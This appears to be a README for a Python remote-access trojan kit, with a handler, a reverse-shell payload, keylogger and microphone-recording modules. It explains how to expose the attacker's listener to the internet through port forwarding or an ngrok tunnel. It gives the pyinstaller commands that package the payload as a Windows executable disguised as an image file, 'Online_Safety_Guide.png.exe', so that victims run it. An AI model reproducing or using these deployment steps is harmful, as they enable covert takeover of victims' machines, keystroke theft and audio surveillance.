================================================================================================================================================

# REVERSE_SHELL AND HANDLER #
#============================

# 1) handler.py HANDLES THE CONTROLS OF THE PAYLOAD
# 2) CORRESPONDING reverse_shell.py SCRIPT
# 3) DEPENDEDNT AND INCLUDED SCRIPTS - keyLogger.py ; soundRecorder.py

# THIS SET OF SCRIPTS, THE HANDLER (handler) ALONG WITH ITS REVERSE_SHELL (AND OTHER DEPENDENT SCRIPTS)
# ALLOWS A BASIC REMOTE CONNECTION TO A TARGET MACHINE

# handler.py IS THE CONTROLLER (TO BE DEPLOYED ON THE ATTACKER MACHINE)
# reverse_shell.py - "Online_Safety_Guide.png.exe" IS THE PAYLOAD (TO BE INJECTED INTO THE VICTIM AND NEEDS TO BE RUN BY THE USER)

================================================================================================================================================

# MANDATORY REQUIREMENTS:-

# python2.7
# PYTHON MODULE DEPENDENCY LIST:-
	> socket
	> termcolor
	> os
	> sys
	> json
	> base64
	> subprocess
	> datetime
	> time
	> shutil
	> threading
	> requests
	> mss (4.0.2)
	> PyAudio
	> wave
	> Pynput

================================================================================================================================================
------------------------------------------------------------------------------------------------------------------------------------------------
================================================================================================================================================

# ONCE CONNECTED, THE handler REPLICATES A CLI OF THE VICTIM MACHINE
#
# COMMAND LINE/ TERMINAL/ SHELL COMMANDS CAN BE ISSUED FROM THE handler TO BE EXECUTED ON THE VICTIM
#
# THE handler CAN ALSO UPLOAD (INJECT FILES FROM ATTACKER MACHINE TO VICTIM)
# OR DOWNLOAD (PULL FILES FROM VICTIM TO ATTACKER) FILES TO AND FROM THE VICTIM
# USING THE get OR put COMMANDS
#
# THE CONNECTION CAN BE CLOSED BY ISSUING THE quit OR exit COMMANDS
#
# ONCE CONNECTED, THE ATTACKER CAN PERFORM EXPLOITS LIKE TAKING CONTROL OF
# THE VICTIM MACHINE'S MICROPHONE AND RECORD AUDIO
# OR LOG KEYSTROKES ON THE VICTIM MACHINE AND SEND THOSE RECORDED FILES BACK TO THE ATTACKER
#
# TO GET A FULL LIST OF POSSIBLE COMMANDS THAT CAN BE ISSUED, 
# THE HANDLER CAN TYPE THE help COMMAND 
# NOTE THAT THIS OVERRIDES THE COMMAND LINE KEYWORD help

================================================================================================================================================

# NOTE:-
# ------
# THIS IS A NON-PERSISTENT SCRIPT WHEN DEPLOYED ON A LINUX/ UNIX BASED TARGET
# ONCE DISCONNECTED, THE WHOLE CONNECTION PROCESS NEEDS TO BE RE-DONE
# BOTH ON THE ATTACKER AND THE VICTIM ENDS
------------------------------------------------------------------------------------------------------------------------------------------------

# IF ALL THE REQUIREMENTS ARE MET IN THE SYSTEMS (EITHER ATTACKER OR TARGET)
# THE SCRIPTS CAN BE RUN USING THE python COMMAND INSTALLED IN THE SYSTEM
# [SEE README_MANUAL.txt] IN "USAGE_GUIDES" DIRECTORY
# 
# OTHERWISE, IF wine IS INSTALLED IN THE LINUX BASED ATTACKER SYSTEM
# AND THE REQUIREMENTS ARE MET IN WINE, THE ATTACKER CAN COMPILE 
# A PAYLOAD TO BE DEPLOYED AS A DISGUISED WINDOWS EXECUTABLE
# [SEE README_AUTOMATIC.txt] IN "USAGE_GUIDES" DIRECTORY
_____________________________________________________________________________________________________________________________________________________
-----------------------------------------------------------------------------------------------------------------------------------------------------

# TO RUN THE SCRIPT OVER THE INTERNET [OUTSIDE LOCAL AREA NETWORK]:-
--------------------------------------------------------------------

# POSITIVELY FOLLOW THE README_MANUAL.txt
# 
# THE PUBLIC IP ADDRESS OF THE ATTACKER MACHINE IS REQUIRED
# SET THE REVERSE SHELL WITH THIS PUBLIC IP ADDRESS										[HOW TO GIVEN IN README_MANUAL.txt]
# SET THE HANDLER WITH THE LOCAL IP ADDRESS OF THE ATTACKER
# SET THE LISTEN/ CONNECT PORT NUMBERS IF REQUIRED ... THEY MUST BE THE SAME!
#
# CONFIGURE YOUR ROUTER FOR IP FORWARDING AS FOLLOWING:-
--------------------------------------------------------
[*] SERVICE PORT = 54321	[OR AS SET IN SCRIPT]
[*] INTERNAL PORT = 54321	[MUST BE SAME AS ABOVE]
[*] IP ADDRESS = LOCAL IP ADDRESS OF THE ATTACKER
[*] PROTOCOL = TCP/ UDP	[USUALLY THIS IS DEFAULT]
#
#
# ALTERNATIVE (REQUIRES NGROK OR A SIMILAR SERVICE)
----------------------------------------------------
#
# FIRE UP NGROK WITH TCP TUNNEL -> FORWARDING IT TO THE DESIRED ATTACKER'S IP AND PORT
#
# EXAMPLE USAGE:-
------------------
./ngrok tcp 192.168.0.X:54321
#
# THE ABOVE COMMAND WILL ESTABLISH A NGROK TUNNEL, FORWARDING ALL TCP TRAFFIC TO THE ATTACKER MACHINE WITH IP 192.168.0.X ON THE LOCAL NETWORK
# 
# NGROK SHOULD KEEP RUNNING DURING THE WHOLE PROCESS
# THE LINK PROVIDED BY NGROK WOULD BE SOMETHING LIKE :	tcp://something.ngrok.io:XXXXX
# WHERE XXXXX IS THE PORT NUMBER OF THE NGROK TUNNEL
#
# THE CONNECTING IP SHOULD BE GIVEN AS	:	something.ngrok.io
# THE CONNECTING PORT SHOULD BE SET UP	:	XXXXX
#
=====================================================================================================================================================
#
# ONCE THE ABOVE STEPS ARE DONE CORRECTLY, THE PAYLOAD CAN STILL BE CREATED USING THE FOLLOWING COMMAND AS ROOT
# 
root@host:~# wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/home/voldemort/Desktop/pythonScripts/Reverse_Shell/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon /home/voldemort/Desktop/pythonScripts/Reverse_Shell/Res/Icons/img.ico -n Online_Safety_Guide.png Scripts/reverse_shell.py

root@host:~# cp dist/Online_Safety_Guide.png.exe Online_Safety_Guide.png.exe

root@host:~# rm -r dist/ build/ Online_Safety_Guide.png.spec

# AND THE PAYLOAD WILL BE GENERATED AND SAVED IN YOUR CURRENT WORKING DIRECTORY [SHOULD BE THE PARENT DIRECTORY TO AVOID ANY DEPENDENCY ERRORS]

=========================================================================================================================================================================================================================================================
